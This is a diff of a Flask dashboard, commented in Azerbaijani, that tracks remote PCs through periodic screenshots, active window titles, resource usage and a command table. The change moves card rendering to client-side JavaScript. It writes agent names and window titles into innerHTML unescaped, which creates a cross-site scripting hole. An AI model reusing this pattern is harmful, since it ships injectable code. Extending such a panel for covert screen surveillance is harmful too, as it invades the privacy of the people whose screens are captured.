@@ -103,7 +103,6 @@ def init_db():
             )
             """
         )
-        ### DƏYİŞDİM 1: VIDEO COMMAND UCUN CEDVEL
         cur.execute(
             """
             CREATE TABLE IF NOT EXISTS commands (
@@ -246,14 +245,14 @@ def login():
             <style>
                 * { box-sizing: border-box; margin: 0; padding: 0; }
                 body { background:#050910; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; color:#fff; padding:16px; }
-           .card { background:#0f172a; padding:20px; border-radius:16px; width:100%; max-width:320px; border:1px solid #1e293b; }
+        .card { background:#0f172a; padding:20px; border-radius:16px; width:100%; max-width:320px; border:1px solid #1e293b; }
                 h2 { font-size:18px; margin-bottom:16px; text-align:center; }
                 label { font-size:13px; color:#94a3b8; margin-bottom:6px; display:block; }
                 input { width:100%; padding:10px 12px; border-radius:8px; margin-bottom:12px; border:1px solid #1f2937; background:#020617; color:#fff; font-size:14px; }
                 input:focus { outline:none; border-color:#22c55e; }
                 button { width:100%; padding:11px; border-radius:8px; background:#22c55e; border:none; cursor:pointer; font-weight:600; font-size:15px; color:#000; }
                 button:active { background:#16a34a; }
-           .error { background:#7f1d1d; padding:10px; border-radius:8px; margin-bottom:12px; font-size:13px; text-align:center; }
+        .error { background:#7f1d1d; padding:10px; border-radius:8px; margin-bottom:12px; font-size:13px; text-align:center; }
             </style>
         </head>
         <body>
@@ -352,7 +351,6 @@ def upload():
 
     return "OK", 200
 
-### DƏYİŞDİM 2: VIDEO UCUN ROUTE-LAR
 @app.route("/upload_video", methods=["POST"])
 def upload_video():
     try:
@@ -498,15 +496,15 @@ def agent_detail(name):
             <style>
                 * { box-sizing:border-box; margin:0; padding:0; }
                 body{background:#020617;color:#e5e7eb;font-family:-apple-system,sans-serif;padding:12px;}
-          .card{border:1px solid #1e293b;border-radius:12px;padding:14px;background:#0f172a;max-width:700px;margin:0 auto;}
-          .meta{margin-top:10px;font-size:13px;color:#cbd5e1;line-height:1.6;}
+         .card{border:1px solid #1e293b;border-radius:12px;padding:14px;background:#0f172a;max-width:700px;margin:0 auto;}
+         .meta{margin-top:10px;font-size:13px;color:#cbd5e1;line-height:1.6;}
                 img{width:100%;border-radius:8px;margin-top:10px;cursor:pointer;}
                 a{color:#38bdf8;text-decoration:none;font-size:14px;}
-          .fullscreen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:999;}
-          .fullscreen img{max-width:95%;max-height:95%;width:auto;height:auto;object-fit:contain;}
-          .close{position:absolute;top:15px;right:20px;font-size:36px;color:#fff;cursor:pointer;}
-          .btn{background:#22c55e;color:#000;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;font-size:13px;margin-right:8px;}
-          .input{background:#020617;border:1px solid #1e293b;color:#fff;padding:6px 8px;border-radius:6px;font-size:13px;}
+         .fullscreen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:999;}
+         .fullscreen img{max-width:95%;max-height:95%;width:auto;height:auto;object-fit:contain;}
+         .close{position:absolute;top:15px;right:20px;font-size:36px;color:#fff;cursor:pointer;}
+         .btn{background:#22c55e;color:#000;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;font-size:13px;margin-right:8px;}
+         .input{background:#020617;border:1px solid #1e293b;color:#fff;padding:6px 8px;border-radius:6px;font-size:13px;}
             </style>
             <script>
                 const AGENT_NAME = "{{ a.name }}";
@@ -521,7 +519,7 @@ def agent_detail(name):
                     if(e.key === 'Escape') closeFullscreen();
                 });
 
-                ### DƏYİŞDİM 3: FULLSCREEN DE YENILENIR + AD REDAKTE + VIDEO
+                ### DÜZƏLİŞ 1: AD DEYISENDE EKRANI YENILE + FULLSCREEN DE YENILENIR
                 function updateAgent(){
                     fetch('/api/agents').then(r=>r.json()).then(data=>{
                         const agent = [...data.online,...data.offline,...data.hidden].find(x=>x.name===AGENT_NAME);
@@ -529,6 +527,7 @@ def agent_detail(name):
                             const newSrc = '/screens/' + AGENT_NAME + '_last.jpg?t=' + agent.last_seen_ts;
                             document.getElementById('agent-img').src = newSrc;
                             document.getElementById('fsimg').src = newSrc;
+                            document.getElementById('agent-title').textContent = agent.display_name;
                             document.getElementById('meta-box').innerHTML = `
                                 Last seen: ${agent.last_seen_human}<br>
                                 CPU: ${agent.cpu_usage.toFixed(1)}% | RAM: ${agent.ram_usage.toFixed(1)}%<br>
@@ -549,7 +548,7 @@ def agent_detail(name):
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({full_name: newName})
-                    }).then(()=>location.reload());
+                    }).then(()=>updateAgent()); // DÜZƏLİŞ: reload yox, updateAgent
                 }
                 setInterval(updateAgent, 1000);
             </script>
@@ -557,7 +556,7 @@ def agent_detail(name):
         <body>
             <a href="/">← Geri</a>
             <div class="card">
-                <h3>{{ a.display_name }}</h3>
+                <h3 id="agent-title">{{ a.display_name }}</h3>
                 <small style="color:#94a3b8;">PC: {{ a.name }}</small>
                 <div style="margin:10px 0;">
                     <input id="name-input" class="input" value="{{ a.display_name }}" placeholder="Adı dəyiş">
@@ -602,22 +601,22 @@ def dashboard():
                 body{background:#020617;color:#e5e7eb;font-family:-apple-system,sans-serif;}
                 header{padding:10px 12px;border-bottom:1px solid #1e293b;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;background:#020617;z-index:100;}
                 header div{font-weight:600;font-size:15px;}
-          .section{padding:10px 12px 4px;font-size:15px;font-weight:600;color:#e5e7eb;}
-          .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;padding:0 12px 12px;}
-          .card{border:1px solid #1e293b;border-radius:10px;padding:10px;background:#0f172a;position:relative;}
-          .menu-btn{background:none;border:none;color:#94a3b8;cursor:pointer;font-size:18px;padding:0 4px;}
-          .menu-box{position:absolute;right:8px;top:32px;background:#1e293b;border:1px solid #334155;border-radius:8px;display:none;z-index:10;min-width:100px;}
-          .menu-box button{background:none;border:none;color:#fff;padding:8px 12px;width:100%;text-align:left;cursor:pointer;font-size:13px;}
-          .menu-box button:active{background:#334155;}
-          .meta{margin-top:6px;font-size:11px;color:#94a3b8;line-height:1.5;position:relative;z-index:2;}
-          .empty{padding:0 12px 12px;color:#64748b;font-size:13px;}
-          .pc-name{color:#38bdf8;cursor:pointer;text-decoration:none;font-weight:600;font-size:14px;}
-          .pc-name:hover{text-decoration:underline;}
-          .screen-img{width:100%;border-radius:6px;margin-top:6px;max-height:140px;object-fit:cover;cursor:pointer;position:relative;z-index:1;}
-          .fullscreen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:999;}
-          .fullscreen img{max-width:95%;max-height:95%;width:auto;height:auto;object-fit:contain;}
-          .close{position:absolute;top:15px;right:20px;font-size:36px;color:#fff;cursor:pointer;}
-          .status{margin-top:3px;font-size:11px;}
+         .section{padding:10px 12px 4px;font-size:15px;font-weight:600;color:#e5e7eb;}
+         .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;padding:0 12px 12px;}
+         .card{border:1px solid #1e293b;border-radius:10px;padding:10px;background:#0f172a;position:relative;}
+         .menu-btn{background:none;border:none;color:#94a3b8;cursor:pointer;font-size:18px;padding:0 4px;}
+         .menu-box{position:absolute;right:8px;top:32px;background:#1e293b;border:1px solid #334155;border-radius:8px;display:none;z-index:10;min-width:100px;}
+         .menu-box button{background:none;border:none;color:#fff;padding:8px 12px;width:100%;text-align:left;cursor:pointer;font-size:13px;}
+         .menu-box button:active{background:#334155;}
+         .meta{margin-top:6px;font-size:11px;color:#94a3b8;line-height:1.5;position:relative;z-index:2;}
+         .empty{padding:0 12px 12px;color:#64748b;font-size:13px;}
+         .pc-name{color:#38bdf8;cursor:pointer;text-decoration:none;font-weight:600;font-size:14px;}
+         .pc-name:hover{text-decoration:underline;}
+         .screen-img{width:100%;border-radius:6px;margin-top:6px;max-height:140px;object-fit:cover;cursor:pointer;position:relative;z-index:1;}
+         .fullscreen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:999;}
+         .fullscreen img{max-width:95%;max-height:95%;width:auto;height:auto;object-fit:contain;}
+         .close{position:absolute;top:15px;right:20px;font-size:36px;color:#fff;cursor:pointer;}
+         .status{margin-top:3px;font-size:11px;}
             </style>
             <script>
                 function toggleMenu(name){
@@ -646,33 +645,83 @@ def dashboard():
                     document.querySelectorAll('.menu-box').forEach(el => el.style.display='none');
                 });
 
-                ### DƏYİŞDİM 4: YENILENIR YAZISINI SILDIM + FULLSCREEN YENILENIR + 1 SANIYE
+                ### DÜZƏLİŞ 2: TAM YENI RENDER FUNKSIYASI - KARTLAR SILINIB YARANIR AMMA TITREMIR
+                let currentData = null;
                 function refreshData(){
                     fetch('/api/agents')
-                    .then(r => r.json())
-                    .then(data => {
-                            updateCards(data.online, 'online');
-                            updateCards(data.offline, 'offline');
-                            updateCards(data.hidden, 'hidden');
-                            document.getElementById('online-count').textContent = data.online.length;
-                            document.getElementById('offline-count').textContent = data.offline.length;
-                            document.getElementById('hidden-count').textContent = data.hidden.length;
+                   .then(r => r.json())
+                   .then(data => {
+                            // Eger agent sayi veya statusu deyisibse, tam render et
+                            if(JSON.stringify(currentData)!== JSON.stringify(data)){
+                                currentData = data;
+                                renderAll(data);
+                            } else {
+                                // Eks halda sadece sekilleri yenile
+                                updateOnlyImages(data);
+                            }
                         });
                 }
 
-                function updateCards(agents, type){
-                    agents.forEach(a => {
-                        const img = document.getElementById('img-' + type + '-' + a.name);
-                        const meta = document.getElementById('meta-' + type + '-' + a.name);
-                        const status = document.getElementById('status-' + type + '-' + a.name);
-                        const newSrc = '/screens/' + a.name + '_last.jpg?t=' + a.last_seen_ts;
-                        if(img) img.src = newSrc;
-                        if(isFullscreenOpen && document.getElementById('fsimg').src.includes(a.name)) document.getElementById('fsimg').src = newSrc;
-                        if(meta) meta.innerHTML = a.last_seen_human + ' | CPU ' + a.cpu_usage.toFixed(0) + '% | RAM ' + a.ram_usage.toFixed(0) + '%<br>' + a.active_window.substring(0,30);
-                        if(status) {
-                            status.style.color = type==='hidden'?'#64748b':a.online?'#4ade80':'#f87171';
-                            status.textContent = '● ' + (type==='hidden'?'GİZLİ':a.online?'ONLINE':'OFFLINE');
-                        }
+                function renderAll(data){
+                    document.getElementById('online-count').textContent = data.online.length;
+                    document.getElementById('offline-count').textContent = data.offline.length;
+                    document.getElementById('hidden-count').textContent = data.hidden.length;
+                    document.getElementById('online-grid').innerHTML = renderSection(data.online, 'online');
+                    document.getElementById('offline-grid').innerHTML = renderSection(data.offline, 'offline');
+                    document.getElementById('hidden-grid').innerHTML = renderSection(data.hidden, 'hidden');
+                }
+
+                function renderSection(agents, type){
+                    if(agents.length === 0) return '<div class="empty">Agent yoxdur.</div>';
+                    return agents.map(a => `
+                        <div class="card" id="card-${type}-${a.name}">
+                            <div style="display:flex;justify-content:space-between;align-items:flex-start;">
+                                <div>
+                                    <a href="/agent/${a.name}" class="pc-name">${a.display_name}</a><br>
+                                    <small style="color:#64748b;font-size:11px;">${a.name}</small>
+                                </div>
+                                <div>
+                                    <button class="menu-btn" onclick="toggleMenu('${type==='hidden'?'h':''}${a.name}')">⋮</button>
+                                    <div id="menu_${type==='hidden'?'h':''}${a.name}" class="menu-box">
+                                        ${type==='hidden'
+                                          ? `<form method="POST" action="/agent/${a.name}/unhide"><button>👁 Göstər</button></form>`
+                                           : `<form method="POST" action="/agent/${a.name}/hide"><button>👁 Gizlət</button></form>`
+                                        }
+                                        <form method="POST" action="/agent/${a.name}/delete" onsubmit="return confirm('Silmək istəyirsiniz?')">
+                                            <button style="color:#f87171">🗑 Sil</button>
+                                        </form>
+                                    </div>
+                                </div>
+                            <div class="status" id="status-${type}-${a.name}" style="color:${type==='hidden'?'#64748b':a.online?'#4ade80':'#f87171'};">● ${type==='hidden'?'GİZLİ':a.online?'ONLINE':'OFFLINE'}</div>
+                            <img id="img-${type}-${a.name}" onclick="openFullscreen(this.src)" class="screen-img" src="/screens/${a.name}_last.jpg?t=${a.last_seen_ts}" style="opacity:${type==='hidden'?0.3:a.online?1:0.5};">
+                            <div class="meta" id="meta-${type}-${a.name}">
+                                ${a.last_seen_human} | CPU ${a.cpu_usage.toFixed(0)}% | RAM ${a.ram_usage.toFixed(0)}%<br>
+                                ${a.active_window.substring(0,30)}
+                            </div>
+                        </div>
+                    `).join('');
+                }
+
+                function updateOnlyImages(data){
+                    [...data.online,...data.offline,...data.hidden].forEach(a => {
+                        const types = ['online','offline','hidden'];
+                        types.forEach(type => {
+                            const img = document.getElementById(`img-${type}-${a.name}`);
+                            if(img){
+                                const newSrc = `/screens/${a.name}_last.jpg?t=${a.last_seen_ts}`;
+                                img.src = newSrc;
+                                if(isFullscreenOpen && document.getElementById('fsimg').src.includes(a.name)){
+                                    document.getElementById('fsimg').src = newSrc;
+                                }
+                            }
+                            const meta = document.getElementById(`meta-${type}-${a.name}`);
+                            if(meta) meta.innerHTML = `${a.last_seen_human} | CPU ${a.cpu_usage.toFixed(0)}% | RAM ${a.ram_usage.toFixed(0)}%<br>${a.active_window.substring(0,30)}`;
+                            const status = document.getElementById(`status-${type}-${a.name}`);
+                            if(status){
+                                status.style.color = type==='hidden'?'#64748b':a.online?'#4ade80':'#f87171';
+                                status.textContent = '● ' + (type==='hidden'?'GİZLİ':a.online?'ONLINE':'OFFLINE');
+                            }
+                        });
                     });
                 }
 
@@ -687,88 +736,13 @@ def dashboard():
             </header>
 
             <div class="section">Online (<span id="online-count">{{ online_agents|length }}</span>)</div>
-            <div class="grid" id="online-grid">
-                {% for a in online_agents %}
-                <div class="card" id="card-online-{{ a.name }}">
-                    <div style="display:flex;justify-content:space-between;align-items:flex-start;">
-                        <div>
-                            <a href="/agent/{{ a.name }}" class="pc-name">{{ a.display_name }}</a><br>
-                            <small style="color:#64748b;font-size:11px;">{{ a.name }}</small>
-                        </div>
-                        <div>
-                            <button class="menu-btn" onclick="toggleMenu('{{ a.name }}')">⋮</button>
-                            <div id="menu_{{ a.name }}" class="menu-box">
-                                <form method="POST" action="/agent/{{ a.name }}/hide"><button>👁 Gizlət</button></form>
-                                <form method="POST" action="/agent/{{ a.name }}/delete" onsubmit="return confirm('Silmək istəyirsiniz?')">
-                                    <button style="color:#f87171">🗑 Sil</button>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="status" id="status-online-{{ a.name }}" style="color:#4ade80;">● ONLINE</div>
-                    <img id="img-online-{{ a.name }}" onclick="openFullscreen(this.src)" class="screen-img" src="/screens/{{ a.name }}_last.jpg?t={{ a.last_seen_ts }}">
-                    <div class="meta" id="meta-online-{{ a.name }}">
-                        {{ a.last_seen_human }} | CPU {{ '%.0f'|format(a.cpu_usage) }}% | RAM {{ '%.0f'|format(a.ram_usage) }}%<br>
-                        {{ a.active_window[:30] }}
-                    </div>
-                </div>
-                {% endfor %}
-            </div>
+            <div class="grid" id="online-grid"></div>
 
             <div class="section">Offline (<span id="offline-count">{{ offline_agents|length }}</span>)</div>
-            <div class="grid" id="offline-grid">
-                {% for a in offline_agents %}
-                <div class="card" id="card-offline-{{ a.name }}">
-                    <div style="display:flex;justify-content:space-between;align-items:flex-start;">
-                        <div>
-                            <a href="/agent/{{ a.name }}" class="pc-name">{{ a.display_name }}</a><br>
-                            <small style="color:#64748b;font-size:11px;">{{ a.name }}</small>
-                        </div>
-                        <div>
-                            <button class="menu-btn" onclick="toggleMenu('{{ a.name }}')">⋮</button>
-                            <div id="menu_{{ a.name }}" class="menu-box">
-                                <form method="POST" action="/agent/{{ a.name }}/hide"><button>👁 Gizlət</button></form>
-                                <form method="POST" action="/agent/{{ a.name }}/delete" onsubmit="return confirm('Silmək istəyirsiniz?')">
-                                    <button style="color:#f87171">🗑 Sil</button>
-                                </form>
-                            </div>
-                        </div>
-                    <div class="status" id="status-offline-{{ a.name }}" style="color:#f87171;">● OFFLINE</div>
-                    <img id="img-offline-{{ a.name }}" onclick="openFullscreen(this.src)" class="screen-img" src="/screens/{{ a.name }}_last.jpg?t={{ a.last_seen_ts }}" style="opacity:0.5;">
-                    <div class="meta" id="meta-offline-{{ a.name }}">
-                        {{ a.last_seen_human }} | CPU {{ '%.0f'|format(a.cpu_usage) }}% | RAM {{ '%.0f'|format(a.ram_usage) }}%<br>
-                        {{ a.active_window[:30] }}
-                    </div>
-                </div>
-                {% endfor %}
-            </div>
+            <div class="grid" id="offline-grid"></div>
 
             <div class="section">Gizlədilən (<span id="hidden-count">{{ hidden_agents|length }}</span>)</div>
-            <div class="grid" id="hidden-grid">
-                {% for a in hidden_agents %}
-                <div class="card" id="card-hidden-{{ a.name }}">
-                    <div style="display:flex;justify-content:space-between;align-items:flex-start;">
-                        <div>
-                            <a href="/agent/{{ a.name }}" class="pc-name">{{ a.display_name }}</a><br>
-                            <small style="color:#64748b;font-size:11px;">{{ a.name }}</small>
-                        </div>
-                        <div>
-                            <button class="menu-btn" onclick="toggleMenu('h{{ a.name }}')">⋮</button>
-                            <div id="menu_h{{ a.name }}" class="menu-box">
-                                <form method="POST" action="/agent/{{ a.name }}/unhide"><button>👁 Göstər</button></form>
-                                <form method="POST" action="/agent/{{ a.name }}/delete" onsubmit="return confirm('Silmək istəyirsiniz?')">
-                                    <button style="color:#f87171">🗑 Sil</button>
-                                </form>
-                            </div>
-                        </div>
-                    <div class="status" id="status-hidden-{{ a.name }}" style="color:#64748b;">● GİZLİ</div>
-                    <img id="img-hidden-{{ a.name }}" onclick="openFullscreen(this.src)" class="screen-img" src="/screens/{{ a.name }}_last.jpg?t={{ a.last_seen_ts }}" style="opacity:0.3;">
-                    <div class="meta" id="meta-hidden-{{ a.name }}">
-                        {{ a.last_seen_human }} | CPU {{ '%.0f'|format(a.cpu_usage) }}% | RAM {{ '%.0f'|format(a.ram_usage) }}%
-                    </div>
-                </div>
-                {% endfor %}
-            </div>
+            <div class="grid" id="hidden-grid"></div>
 
             <div id="fullscreen" class="fullscreen" onclick="closeFullscreen()">
                 <span class="close" onclick="closeFullscreen()">&times;</span>
